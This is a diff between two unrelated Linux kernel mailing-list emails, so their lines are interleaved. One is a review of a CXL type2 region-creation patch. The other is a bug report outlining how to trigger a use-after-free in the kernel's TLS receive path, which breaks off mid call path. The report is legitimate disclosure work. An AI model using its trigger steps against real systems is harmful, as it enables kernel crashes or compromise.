@@ -1,348 +1,255 @@
-Return-Path: <netdev+bounces-211764-lists+netdev=lfdr.de@vger.kernel.org>
+Return-Path: <netdev+bounces-211765-lists+netdev=lfdr.de@vger.kernel.org>
 X-Original-To: lists+netdev@lfdr.de
 Delivered-To: lists+netdev@lfdr.de
-Received: from am.mirrors.kernel.org (am.mirrors.kernel.org [147.75.80.249])
-	by mail.lfdr.de (Postfix) with ESMTPS id 9BF12B1B88A
-	for <lists+netdev@lfdr.de>; Tue,  5 Aug 2025 18:30:57 +0200 (CEST)
+Received: from dfw.mirrors.kernel.org (dfw.mirrors.kernel.org [IPv6:2605:f480:58:1:0:1994:3:14])
+	by mail.lfdr.de (Postfix) with ESMTPS id ADDE1B1B898
+	for <lists+netdev@lfdr.de>; Tue,  5 Aug 2025 18:33:45 +0200 (CEST)
 Received: from smtp.subspace.kernel.org (relay.kernel.org [52.25.139.140])
 	(using TLSv1.2 with cipher ECDHE-ECDSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by am.mirrors.kernel.org (Postfix) with ESMTPS id 3F63018A6C80
-	for <lists+netdev@lfdr.de>; Tue,  5 Aug 2025 16:31:16 +0000 (UTC)
+	by dfw.mirrors.kernel.org (Postfix) with ESMTPS id 8B4774E1007
+	for <lists+netdev@lfdr.de>; Tue,  5 Aug 2025 16:33:44 +0000 (UTC)
 Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
-	by smtp.subspace.kernel.org (Postfix) with ESMTP id EB0AA1F4171;
-	Tue,  5 Aug 2025 16:30:52 +0000 (UTC)
+	by smtp.subspace.kernel.org (Postfix) with ESMTP id E99F52222D2;
+	Tue,  5 Aug 2025 16:33:41 +0000 (UTC)
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=syst3mfailure.io header.i=@syst3mfailure.io header.b="YxA7yI5O"
+	dkim=pass (2048-bit key) header.d=intel.com header.i=@intel.com header.b="asy5Ss0v"
 X-Original-To: netdev@vger.kernel.org
-Received: from mail-24421.protonmail.ch (mail-24421.protonmail.ch [109.224.244.21])
+Received: from mgamail.intel.com (mgamail.intel.com [192.198.163.17])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 144311F03D5
-	for <netdev@vger.kernel.org>; Tue,  5 Aug 2025 16:30:48 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=109.224.244.21
-ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1754411452; cv=none; b=cLC+qD9PH+ToMPx3+0tfo+Ay8ONy1/se/MWei1WFWxdlJ39uI4JGJTRS9UGjGrOok11igWEROD5FNbndS66vUXFSQyoJjtaAV9rheYgB38f5e0K6VMz8AxFpCEjMhC65CtULBMsCn99IFLLOWJoipsnei4Gb4NqFR0UJxVW+a+M=
-ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1754411452; c=relaxed/simple;
-	bh=CB9X8lmEk1wfUFzwUbKjVjWT6TbB7J9JxJzL4Sj2pOI=;
-	h=Date:To:From:Cc:Subject:Message-ID:MIME-Version:Content-Type; b=eNgHJgmz81yYZZ+FXi/tPobHPD222nFrb3Wi8SIW5vhMejTU3akIPtfztge/IukrTpT7QFdENaoA40C5Qzyc4YEmNJiwfvVi4CCEXHj1LtxntQELxb3CAeEZCMX8BIbqeCSmKOZivbdj6oXZByHRHeEpdWArttGhHGGhZYui9SI=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=syst3mfailure.io; spf=pass smtp.mailfrom=syst3mfailure.io; dkim=pass (2048-bit key) header.d=syst3mfailure.io header.i=@syst3mfailure.io header.b=YxA7yI5O; arc=none smtp.client-ip=109.224.244.21
-Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=syst3mfailure.io
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=syst3mfailure.io
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=syst3mfailure.io;
-	s=protonmail2; t=1754411440; x=1754670640;
-	bh=6Wb25S9/AapA6kTFK+PmGOvTzlnondZdcSkqn/2FWwQ=;
-	h=Date:To:From:Cc:Subject:Message-ID:Feedback-ID:From:To:Cc:Date:
-	 Subject:Reply-To:Feedback-ID:Message-ID:BIMI-Selector;
-	b=YxA7yI5O0+ZEHDiMRKUWYQslwG/8RpsMMnf+LT7M/C3DqxUogJQA+begxzJUFXSF2
-	 EOWbXKyay/ecg2asWQXH5aPN+abKrvm9RGjxfIwLLsiuQ2D5rGwu71hFb3aKivZYKr
-	 9enOMOfqy1271+WDWJnfl8Ijhk4pvWI2xmaAWUuIYiX0/aHcplyApNL5gO7TiQdtq+
-	 WmyZkZmK9J8/AS5l3+7GsI8QhW71JhO/WBE1OSUGZb7HmTlQoAb/FO/6aqjHvJ+Ap0
-	 fqKY093Gd3i7PwPt0BI1/aBcgL5Z3QrpOHz8UX5+EtMo5IH1Q+0v8btC1FEdcoOIpp
-	 dyfBSOrrPC3ew==
-Date: Tue, 05 Aug 2025 16:30:37 +0000
-To: "netdev@vger.kernel.org" <netdev@vger.kernel.org>
-From: Savy <savy@syst3mfailure.io>
-Cc: "will@willsroot.io" <will@willsroot.io>, "borisp@nvidia.com" <borisp@nvidia.com>, "john.fastabend@gmail.com" <john.fastabend@gmail.com>, "kuba@kernel.org" <kuba@kernel.org>, "davem@davemloft.net" <davem@davemloft.net>, "edumazet@google.com" <edumazet@google.com>, "pabeni@redhat.com" <pabeni@redhat.com>, "horms@kernel.org" <horms@kernel.org>
-Subject: [BUG] net/tls: UAF and BUG_ON via tcp_recvmsg/tcp_zerocopy_receive
-Message-ID: <tFjq_kf7sWIG3A7CrCg_egb8CVsT_gsmHAK0_wxDPJXfIzxFAMxqmLwp3MlU5EHiet0AwwJldaaFdgyHpeIUCS-3m3llsmRzp9xIOBR4lAI=@syst3mfailure.io>
-Feedback-ID: 69690694:user:proton
-X-Pm-Message-ID: 60f630b8e6aaaabd683d07a3c4b86c3badaebf5b
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 4919C247287;
+	Tue,  5 Aug 2025 16:33:38 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=fail smtp.client-ip=192.198.163.17
+ARC-Seal:i=2; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
+	t=1754411621; cv=fail; b=GZJgGlUrLIBVJc37oKcw3vcH6Xze2N2hXej7CNy3CPH4gp5XB7zvTB1PmYI73yLRcorNSo1GmD4U9tP94RPqrGYt2KEUrIFtA0zpr4r4bi7bMaJ6Koqvaur4aYGHDSEsS7CYorqunT621p5jZTaZ3LImBAWBZKBhE83/QfiRBfA=
+ARC-Message-Signature:i=2; a=rsa-sha256; d=subspace.kernel.org;
+	s=arc-20240116; t=1754411621; c=relaxed/simple;
+	bh=YPHU8kMcUyX/RNcRH8WXnrWrLBqGiuiVaJnRwpegi7U=;
+	h=From:Date:To:CC:Message-ID:In-Reply-To:References:Subject:
+	 Content-Type:MIME-Version; b=CgiE1iPdWGEW2tjchdqVaYbLeZvie8SRnd/NNHX5vYYxytxAsuI2ISWdcrBXoAy+q8gBlfFGp4q4YhCyINNwLRBXDT64eio3o1tUIyr3VPMa+yngqoz1BC3a7mOUrMvNSq6aFuQscWWeThmYGqE01nG3AmQEYIClFySnFm4Pvi8=
+ARC-Authentication-Results:i=2; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=intel.com; spf=pass smtp.mailfrom=intel.com; dkim=pass (2048-bit key) header.d=intel.com header.i=@intel.com header.b=asy5Ss0v; arc=fail smtp.client-ip=192.198.163.17
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=intel.com
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=intel.com
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple;
+  d=intel.com; i=@intel.com; q=dns/txt; s=Intel;
+  t=1754411620; x=1785947620;
+  h=from:date:to:cc:message-id:in-reply-to:references:
+   subject:content-transfer-encoding:mime-version;
+  bh=YPHU8kMcUyX/RNcRH8WXnrWrLBqGiuiVaJnRwpegi7U=;
+  b=asy5Ss0vVwaFFAmz217ySsRg5bbJ8qaLQiJg9K/33BBhEDzteXoqPQ2y
+   IMDfBnRxeH7gQTQAEe8msC2DRifSfYgk4szJ7PKy+ec92aOhLpq9GBF0K
+   FusWuXOsAwbzHv5qTV9fc/ObMMikBfK6XgUQ9q05OEfdTbkSRETvE5Gin
+   tQsZfBMocV2srdGE/ZLjM74T2nU4cc/nGaU5Wj1Aj1xkAdn3Voo+B5Yg9
+   +vpfN7ZfjPfJ9GPTVrApadqw3F13V+3pf5F8UQHdCb23a27G3Mi/Fgj9T
+   eIPVpJP0WJ7KITYTXBYb2Ksvhc1//+xWbNaAqTpWnF02gMA+lNQpQzIwH
+   Q==;
+X-CSE-ConnectionGUID: 3PAoMcB+QTWOZcoDwTUy1g==
+X-CSE-MsgGUID: +F9I3NZCQC6+KFo6u2U3Yw==
+X-IronPort-AV: E=McAfee;i="6800,10657,11513"; a="56626856"
+X-IronPort-AV: E=Sophos;i="6.17,268,1747724400"; 
+   d="scan'208";a="56626856"
+Received: from orviesa005.jf.intel.com ([10.64.159.145])
+  by fmvoesa111.fm.intel.com with ESMTP/TLS/ECDHE-RSA-AES256-GCM-SHA384; 05 Aug 2025 09:33:39 -0700
+X-CSE-ConnectionGUID: ++GQmw9DQFmu5Hv64NcXQA==
+X-CSE-MsgGUID: sES6kp/3QI2yfkh33lVp1A==
+X-ExtLoop1: 1
+X-IronPort-AV: E=Sophos;i="6.17,268,1747724400"; 
+   d="scan'208";a="169915546"
+Received: from orsmsx901.amr.corp.intel.com ([10.22.229.23])
+  by orviesa005.jf.intel.com with ESMTP/TLS/ECDHE-RSA-AES256-GCM-SHA384; 05 Aug 2025 09:33:38 -0700
+Received: from ORSMSX902.amr.corp.intel.com (10.22.229.24) by
+ ORSMSX901.amr.corp.intel.com (10.22.229.23) with Microsoft SMTP Server
+ (version=TLS1_2, cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id
+ 15.2.1748.26; Tue, 5 Aug 2025 09:33:38 -0700
+Received: from ORSEDG903.ED.cps.intel.com (10.7.248.13) by
+ ORSMSX902.amr.corp.intel.com (10.22.229.24) with Microsoft SMTP Server
+ (version=TLS1_2, cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id
+ 15.2.1748.26 via Frontend Transport; Tue, 5 Aug 2025 09:33:38 -0700
+Received: from NAM12-BN8-obe.outbound.protection.outlook.com (40.107.237.87)
+ by edgegateway.intel.com (134.134.137.113) with Microsoft SMTP Server
+ (version=TLS1_2, cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id
+ 15.2.1748.26; Tue, 5 Aug 2025 09:33:37 -0700
+ARC-Seal: i=1; a=rsa-sha256; s=arcselector10001; d=microsoft.com; cv=none;
+ b=nUZ7m3EKkLY+X5YDa45R/marEUKxbzFTzxwVdC2wJaZj0Yhx2FSU5gPxvzBbhkTjYyW8Da8RpF53tmRVT6DMZYNQ3JtyEM2OUOEOFltMxy1KniSYFqFJODKYUucQYSEeGZkK0YG+/fZtBNHd7iAG5r5yJtxPI/jLAmge3jWJoBVwyRauV9OgZP825HDQwAkyQgG5NUMhbzS0hKcmagrTaFryw9Vr05n+NAxk79lCFCKQZggur2eCzEFZG4MzmvRSAENQK70GN42A4hgk0ydTosXy6IozWw+6UJf6R86OLB8bkw5lRCj3nsyAyMDGyR1mNXJa6N1+KoFFScgJxkqT/Q==
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=microsoft.com;
+ s=arcselector10001;
+ h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-AntiSpam-MessageData-ChunkCount:X-MS-Exchange-AntiSpam-MessageData-0:X-MS-Exchange-AntiSpam-MessageData-1;
+ bh=NVumo/cPhq83TdE7HFtO4ps4ttmKHxhBPi1LNjBWm9Y=;
+ b=HitUOHqlVNLc1b2DP539wCd0cZk6mVmVbALIbE9qp7hIBuGs7SOs2vdnxj27oy+O36c+xNQ4C+Rrm3cBfD3FjjLx/VsZ/BAtwfNhEPQ0SaHMzqQvuDt0bNt2yWpkngQCbqbuPHk+YvWJ60QXkirx5gHRjW4Z5T3jNTF4my7kzksvr/cW3A0PAaa/9hef1SIpe/OdtGWXThDWgZsL4/vioFDyXO1PL84Q5XSaZzP8GbZ3HPL8W+jpXXht6tY0lLTXRY6oAW2F0XjyFUNU+PtgmPgS0qPsldLLIxJH1lKbuToVHxp+3QwLxqE3UsRsc0raZU6FBEdcsMrMSZtkmKzG6A==
+ARC-Authentication-Results: i=1; mx.microsoft.com 1; spf=pass
+ smtp.mailfrom=intel.com; dmarc=pass action=none header.from=intel.com;
+ dkim=pass header.d=intel.com; arc=none
+Authentication-Results: dkim=none (message not signed)
+ header.d=none;dmarc=none action=none header.from=intel.com;
+Received: from PH8PR11MB8107.namprd11.prod.outlook.com (2603:10b6:510:256::6)
+ by CH8PR11MB9458.namprd11.prod.outlook.com (2603:10b6:610:2bc::6) with
+ Microsoft SMTP Server (version=TLS1_2,
+ cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id 15.20.8989.21; Tue, 5 Aug
+ 2025 16:33:36 +0000
+Received: from PH8PR11MB8107.namprd11.prod.outlook.com
+ ([fe80::6b05:74cf:a304:ecd8]) by PH8PR11MB8107.namprd11.prod.outlook.com
+ ([fe80::6b05:74cf:a304:ecd8%2]) with mapi id 15.20.8989.018; Tue, 5 Aug 2025
+ 16:33:36 +0000
+From: <dan.j.williams@intel.com>
+Date: Tue, 5 Aug 2025 09:33:33 -0700
+To: <alejandro.lucero-palau@amd.com>, <linux-cxl@vger.kernel.org>,
+	<netdev@vger.kernel.org>, <dan.j.williams@intel.com>, <edward.cree@amd.com>,
+	<davem@davemloft.net>, <kuba@kernel.org>, <pabeni@redhat.com>,
+	<edumazet@google.com>, <dave.jiang@intel.com>
+CC: Alejandro Lucero <alucerop@amd.com>, Jonathan Cameron
+	<Jonathan.Cameron@huawei.com>
+Message-ID: <6892325deccdb_55f09100fb@dwillia2-xfh.jf.intel.com.notmuch>
+In-Reply-To: <20250624141355.269056-19-alejandro.lucero-palau@amd.com>
+References: <20250624141355.269056-1-alejandro.lucero-palau@amd.com>
+ <20250624141355.269056-19-alejandro.lucero-palau@amd.com>
+Subject: Re: [PATCH v17 18/22] cxl: Allow region creation by type2 drivers
+Content-Type: text/plain; charset="utf-8"
+Content-Transfer-Encoding: 7bit
+X-ClientProxiedBy: BY3PR05CA0019.namprd05.prod.outlook.com
+ (2603:10b6:a03:254::24) To PH8PR11MB8107.namprd11.prod.outlook.com
+ (2603:10b6:510:256::6)
 Precedence: bulk
 X-Mailing-List: netdev@vger.kernel.org
 List-Id: <netdev.vger.kernel.org>
 List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
-Content-Type: text/plain; charset=utf-8
-Content-Transfer-Encoding: quoted-printable
+X-MS-PublicTrafficType: Email
+X-MS-TrafficTypeDiagnostic: PH8PR11MB8107:EE_|CH8PR11MB9458:EE_
+X-MS-Office365-Filtering-Correlation-Id: dd1bae8c-41c1-47cc-b78d-08ddd43dd32a
+X-MS-Exchange-SenderADCheck: 1
+X-MS-Exchange-AntiSpam-Relay: 0
+X-Microsoft-Antispam: BCL:0;ARA:13230040|366016|1800799024|376014|7416014|921020;
+X-Microsoft-Antispam-Message-Info: =?utf-8?B?TTFMNGd2THR5OE9SdGhYL3ZFRlRtb3FsL1U5a3dBV1JlZ0VFam92NmpHZk5C?=
+ =?utf-8?B?WVErUGM4cjhrbVRkNEhKMURTSXBNMlRSY1kwUUFYdHg5aWg2L0JyOHNlUHhK?=
+ =?utf-8?B?OG5GZEFZWE9mdkNGRWVydzZnaGNnczFrK1dwL29ucFlRaTNkWjZObHhPMTJy?=
+ =?utf-8?B?M0t6YlNNYkxmOEpmcVRHbDl6c1B0UkY2b2JzRzYyanlxM0FRdk5VT1VjWi9j?=
+ =?utf-8?B?bG53R2lBQURDNG1vK2ZrUXhHM3FTN1VzaWZnaTRhTnJ3Qk54MVRUdGNQakJF?=
+ =?utf-8?B?REdJQXYwdk1BU0NVZDdKWnRyQ1VUdndHQk9KeDd6czMxa2JteHJ3RUREUjk1?=
+ =?utf-8?B?QWpSYUx5Y2V2Q2poMkZZRXJHVnlWa0JHcEhUMHJuc1FTV3lRc25sbWpmS3hX?=
+ =?utf-8?B?emYvSEVaK1RrbGNPV24wcTNHNlpWc1VMWVYvM056MEE0MHBJWjZMK05FY2Er?=
+ =?utf-8?B?TFNnc0tKVlFBeklDL05xaTd4NTFNVjB6QnpLbkJ2MjVlV1QwT0N2QlR4UXVQ?=
+ =?utf-8?B?Ukd1R1IzWXNBaEZSbThNNENMMzFuaWx1czQ2T2twRytVUnd6dFdGYnhuUCtK?=
+ =?utf-8?B?RUJxM0wrWHdKQlo0UUFtK0MvQUZEVHB6Y2RzWDM4YnlXQ2lleFNxeEl2K3I1?=
+ =?utf-8?B?RE5wTVNEaWVpMS9FRVF6VnVsTUdBU1ZKVjdrTFBvck1FQUo4Q3hZRmRNM1NZ?=
+ =?utf-8?B?SVU5ZEZUdVM2aGFkbHRmZ0dBVVZsVmMrZVhiVFpzSFBuaTZ2OWV1V1RBOGty?=
+ =?utf-8?B?UUdmbDVOVWlOWXEzWGVlalcyY1c1UHRQK0FsZkVZZFg1bExQbm9HR0p6RDU4?=
+ =?utf-8?B?bHBEU3o1V0lJVnRlM2VucnpQY1dOeWc0UUpwczdoK2s1WEE5RDNCTFVuMmwz?=
+ =?utf-8?B?allpd0s3M09tUXhJN2tXQW8yL0JrUUJJNzQyeWEvRnJ5MSs5aEMrMnpJaWla?=
+ =?utf-8?B?QmxoMlFpbytCR0hjUFlrSkhXM05QZ01scnVReTdqdEJIRzVSZnZETjU2RzhQ?=
+ =?utf-8?B?RjY2K1NCamEvOUpwTXI3RDFnSHY5L2xZUExGNUtyR25uNzdndHB2dEhQTmx1?=
+ =?utf-8?B?NjVlRzdWTXI0UWp6cFl1MmpKSUx1ZFVkTFMxTVVGQ3NlYXhsVWF2NXR5WitR?=
+ =?utf-8?B?dkZkRXhjQnRRdmhkVDFzK21HZHpjMW4yWnh0NUVtc3F3MU9Eam1vV1pmRmxT?=
+ =?utf-8?B?Zmx4K3MvbDAxMzhNTHlEZlUyNGFLcWtYdTlXQXo0UERJeXRPWTR5VDZWTTlZ?=
+ =?utf-8?B?emVLd1o1RitKWStTSHhxdzY1Y1FJeUJGN1g5Ry9rRXFDTitXZ0VyeU1WMDFv?=
+ =?utf-8?B?U25ZRXU0WDhHZkJYMkFuKzRZV0JCZ0R4U3JtK1NocmhXTlQ3YlM4T3R3MHUy?=
+ =?utf-8?B?eDQxSDhmaURxUDYzRmh1a2JoT1Q4bXFpdnJuVHg1TWtweGxVVzA0em0vV1RO?=
+ =?utf-8?B?SGpsQTh1UUFJNytrR3RkUW4wZ3R6ZFlHRWRTM2N1aDVjc0N3bDVheUcvZ0N3?=
+ =?utf-8?B?S1JDS2MzK2lDK1pTSC9iVXRkT0RoTGVDTmo1NzBMam82RXhaMC8zcVorTG0x?=
+ =?utf-8?B?a1Q3N0xtTFVDOUlCOFNPc1NnZmpVQnVHY0Zuc1JZcVVFTitUekpUcUErQVI2?=
+ =?utf-8?B?RWJZZzQrSzNzWXQvNjNXTUVtZ1pBR2JocGNlSEt6eWtmcWE2dFBMc1hNZjBp?=
+ =?utf-8?B?RXN5T25aMXRITFVhZ1BnU1NlTTdQRlBwQWk0aEdLZDhBQ0Jxc3dhbGo3dXU3?=
+ =?utf-8?B?eVhRZGMrZXRxbExWWGVKZi96aGtLaElBbnZOUkZIQjFRS2dtVVZxS2Q3WVpT?=
+ =?utf-8?B?TEEwamp2czE3Y2JOSGttbURRN01YdHJrUEV6TE16QXpVb0VIOGlnNnAvK0R1?=
+ =?utf-8?B?eWd2QzJEYndmWmhudFVVa2djRlJZckZlNTFmRGhtcjNCWSszTkhmc1FxY1ZV?=
+ =?utf-8?B?MVBkaUF1NVd6VkhyWVpHb09SWTlUa2svdDA1eEs2aHdpdEFCNzQrVGNlWkFR?=
+ =?utf-8?B?Q0xobkdSYWdnPT0=?=
+X-Forefront-Antispam-Report: CIP:255.255.255.255;CTRY:;LANG:en;SCL:1;SRV:;IPV:NLI;SFV:NSPM;H:PH8PR11MB8107.namprd11.prod.outlook.com;PTR:;CAT:NONE;SFS:(13230040)(366016)(1800799024)(376014)(7416014)(921020);DIR:OUT;SFP:1101;
+X-MS-Exchange-AntiSpam-MessageData-ChunkCount: 1
+X-MS-Exchange-AntiSpam-MessageData-0: =?utf-8?B?dmg0aHdZMkxpeU5SbFVxemMxc3dKWEFEYVZHUTF2bXhwaHpXcU9iQTNadmJH?=
+ =?utf-8?B?K0I0aTE4VmtrOUg0V3RHSFB0WXhpQzJvVFZ6NlliN1BjMUR3RjA5RzRTdTZp?=
+ =?utf-8?B?R1BodzdIb01OQVFZUkJyT01Ua0hBcDAvSkVVc3JiSFlFanl4UnJxeExJelZp?=
+ =?utf-8?B?TFBnYTdUUm5NR3ZXcW1tbzNPMVcrdER5Uk5kQ0xzL05MNjFzQStZVGExQURn?=
+ =?utf-8?B?UHJCVmIzeG04bWsvNmtKV3lzSlQ3M1RXbFZRcXliU29xMXcyUVAwbThNSUxx?=
+ =?utf-8?B?U21ra0ppeTcvTVNBTThTMVh1ZWFWeXFwbjg3aEVrazBuRzhnMFcvUVRQc0Q4?=
+ =?utf-8?B?bHZEWktGWWZEQVJWQzZVN294N3N2M1M1SmdUVzdaTGVhSjdEV3VGWnk2MEZ2?=
+ =?utf-8?B?STh4TVBUYjJEUnF2WWlLa0ljUU1jcFlGQk1CMHA1bnRXUnR3bVdyS3J0Q2Zt?=
+ =?utf-8?B?dmFPKytBcHkyMU1zWTdQb1gvMnhrdnZqWlNacTJ1bXRjdHI2Z1U4ZlJqSTVT?=
+ =?utf-8?B?NGdXeHJXWHBheEVxT2FPYVkzTkQ3V05oSXdUVjcyK1ljRkM3MjBxaUJuajhv?=
+ =?utf-8?B?SVB1ZisyblZFQXhPOVlibytnTmVwOUtoUGZFZmtydVA4QXlBQUxPWTNaMmk0?=
+ =?utf-8?B?MFJ3WFlTTmMvaEx3VFlPcHZuRkxSdDE5UGpHRkN4Z3MyUHFYV0grMVVONnRE?=
+ =?utf-8?B?c2ErTExNTStrS21oSUJjcE9TcG1kMnZNM1BoUW03R1VQb0VZMXVNTW5ZRkhv?=
+ =?utf-8?B?MmI4R2t5TXFYTHRaVGRTVnJ6ZGJyOUQwci96VlhSQVFMMkxzZTllMXpEdWR5?=
+ =?utf-8?B?aTlSWDEwcUI2cm1PUzJxcFo1Wk9xd0J0SjRGem5aTGUwQ1RFS05NNHcraVVt?=
+ =?utf-8?B?blk5bFZ3TzdLc2FUV0ZkN0dxMkl6Ukc3T0JSYWdUT2RXeWh0YWNydksvNU9E?=
+ =?utf-8?B?SGxhNWtCcEx2enpIRHJsaTFYOXJiS1g1d0J1UXFuK1pNV0NGMjhkS1FQVWNI?=
+ =?utf-8?B?N003RTVVVDV5UEpEOFgxakd2YTZwRitQZThxY3M5MDJ2amxUN2xlMzR1UDdL?=
+ =?utf-8?B?c0ZuY05LR3JWV2dzU2tWOTVCTCtWcFFxS0Z5V2xXSjlhSXhncy9nWjU2bG5Y?=
+ =?utf-8?B?NzBIVEloc3h2Tm9TdDg2M204WHMvK0xZTUd4UG1zRWpxZHUyNkRaR1lvd042?=
+ =?utf-8?B?cVQ3Vmo0dzZKdHI4ZFFvWXdlQ2hLV1k4azZzdFlUK0xHRGdYVkYxYUhSOHZ5?=
+ =?utf-8?B?YVZQeERIZDFrdEl5YVEvT0xxZUI3NmRmWC8vZThjRTFtTU80NUlZUGFTaU1U?=
+ =?utf-8?B?NjVURnhONEo4SmdwRVhoYmJZdlNPdUx0VGhURkhVMkpQcFM4QUh3dERObnlz?=
+ =?utf-8?B?c3l5RnIzN01BZHJ3YnB5NjgxYms0cjZ2Ny9TdENSSE1VYnlQdE50ZTc5OTB1?=
+ =?utf-8?B?NkZreXB3eXhqSDhtRlEwN2JpNk5tVm5VRDlPY0t5NnArZ1ZCKzh2dzZLcEFq?=
+ =?utf-8?B?Q21tRHV1MERWd1dMeDI0TEJWc0pVVVRyYU5RZldnRStGMnZ1RnBSR2pYU2I5?=
+ =?utf-8?B?TGttVWROSHBPazdaY2dJVk13SkRLNTB3MWZsWEpENDllUGdVaGc3MW1CNXFZ?=
+ =?utf-8?B?YjdzRUszTHIzYk04bnduMUU3dSsrQlN0Vjd0NHdZaHFQVDVqUWxuc2dpaUlZ?=
+ =?utf-8?B?WFdGUEYwWHJDL3dhOFdySmV1eExOMHJUN3B6SThaYWNBYm4xRjB6aDYrbE13?=
+ =?utf-8?B?TXVId3JKMU45NVpicy9jOS9DSDk2QURRVHhnMnpTMG0rNzV4WGdoQlZ3TTNS?=
+ =?utf-8?B?ZVB6cWdiZzY1Ujk1ZVhVMmxuaHdhSkM0OW1EeDRGNk1XK0xtZS83YjhuU1A5?=
+ =?utf-8?B?SUhTR0tKaFg0T09wNHpwUjFGa1IwdEtBVHhjZm14eUptRXVISER4ektoUWNU?=
+ =?utf-8?B?N2tBVHJ5QUlJdXdXV2pRbjFpSmpWQVFQTWdKYUFGSnZVSUVUQnRscE1GRjdX?=
+ =?utf-8?B?QTBKVzZUSkNkWUdIM3cyWG8wTGhydG9tL1RMU3hsR0pSZUhVQUhCZm1RODlD?=
+ =?utf-8?B?dTJzeXQrYjY2eEZMVW5VVWpiZUpPZm1EczNGQzdCQ3lVbWRSNy9OemZ5RlZn?=
+ =?utf-8?B?MkdLWmF1S3RReTFOdnVXWUhwTnRTRVJHVHd5dUM5UzdtR1BibGI5RVlKVFFr?=
+ =?utf-8?B?THc9PQ==?=
+X-MS-Exchange-CrossTenant-Network-Message-Id: dd1bae8c-41c1-47cc-b78d-08ddd43dd32a
+X-MS-Exchange-CrossTenant-AuthSource: PH8PR11MB8107.namprd11.prod.outlook.com
+X-MS-Exchange-CrossTenant-AuthAs: Internal
+X-MS-Exchange-CrossTenant-OriginalArrivalTime: 05 Aug 2025 16:33:35.9413
+ (UTC)
+X-MS-Exchange-CrossTenant-FromEntityHeader: Hosted
+X-MS-Exchange-CrossTenant-Id: 46c98d88-e344-4ed4-8496-4ed7712e255d
+X-MS-Exchange-CrossTenant-MailboxType: HOSTED
+X-MS-Exchange-CrossTenant-UserPrincipalName: iy+lkfQrMuqJ+WXczthm2im1LJ7ZlDfCwV/OlX8PEymmGbKSRV5oQW9U0uutd/3G3WMCBkbbNASo905OCpJflch+7F0pbdHgkRPi2cqKJ6g=
+X-MS-Exchange-Transport-CrossTenantHeadersStamped: CH8PR11MB9458
+X-OriginatorOrg: intel.com
 
-Hi all,
+alejandro.lucero-palau@ wrote:
+> From: Alejandro Lucero <alucerop@amd.com>
+> 
+> Creating a CXL region requires userspace intervention through the cxl
+> sysfs files. Type2 support should allow accelerator drivers to create
+> such cxl region from kernel code.
+> 
+> Adding that functionality and integrating it with current support for
+> memory expanders.
+> 
+> Support an action by the type2 driver to be linked to the created region
+> for unwinding the resources allocated properly.
 
-We've encountered the following UAF bug in net/tls that occurs when perform=
-ing sends=20
-and receive with a TLS socket combined with tcp_recvmsg() or tcp_zerocopy_r=
-eceive().
+The hardest part of CXL is the fact that typical straight-line driver
+expectations like "device present == MMIO available" are violated. An
+accelerator driver needs to worry about asynchronous region detach and
+CXL port detach.
 
-The root cause is similar to the disconnect() bug found a few months ago [1=
-]:
+Ideally any event that takes down a CXL port or the region simply
+results in the accelerator driver being detached to clean everything up.
 
-1. User creates two TCP sockets, forks and
-calls recvmsg() in the child task (this invokes tcp_recvmsg() -> tcp_recvms=
-g_locked() in the kernel).=20
-The syscall blocks waiting for data to become available.
+The difficult part about that is that the remove path for regions and
+CXL ports hold locks that prevent the accelerator remove path from
+running.
 
-2. In the parent task, TLS is set up and a packet is sent.
-Softirq handles the new data and stores a reference to the skb in the strp-=
->anchor fraglist:
+I do not think it is maintainable for every accelerator driver to invent
+its own cleanup scheme like this. The expectation should be that a
+region can go into a defunct state if someone triggers removal actions
+in the wrong order, but otherwise the accelerator driver should be able
+to rely on a detach event to clean everything up.
 
-...
-  tcp_data_queue()
-    tls_data_ready()
-      tls_strp_check_rcv()
-        tls_strp_read_sock()
-          tls_strp_load_anchor_with_queue()
-            first =3D tcp_recv_skb(strp->sk, tp->copied_seq, &offset);
-            ...
-            skb_shinfo(strp->anchor)->frag_list =3D first;
+So opting into CXL operation puts a driver into a situation where it can
+be unbound whenever the CXL link goes down logically or physically.
+Physical device removal of a CXL port expects that the operator has
+first shutdown all driver operations, and if they have not at least the
+driver should not crash while awaiting the remove event.
 
-3. In the child task, tcp_recvmsg_locked() detects the socket is no longer =
-empty.
-The previous skb is eaten with the following call path:
+Physical CXL port removal is the "easy" case since that will naturally
+result in the accelerator 'struct pci_dev' being removed. The more
+difficult cases are the logical removal / shutdown of a CXL port or
+region. Those should schedule accelerator detach and put the region into
+an error state until that cleanup runs.
 
-...
-  tcp_recvmsg()
-    tcp_recvmsg_locked()
-      tcp_eat_recv_skb()
-        skb_unlink()
-        ...
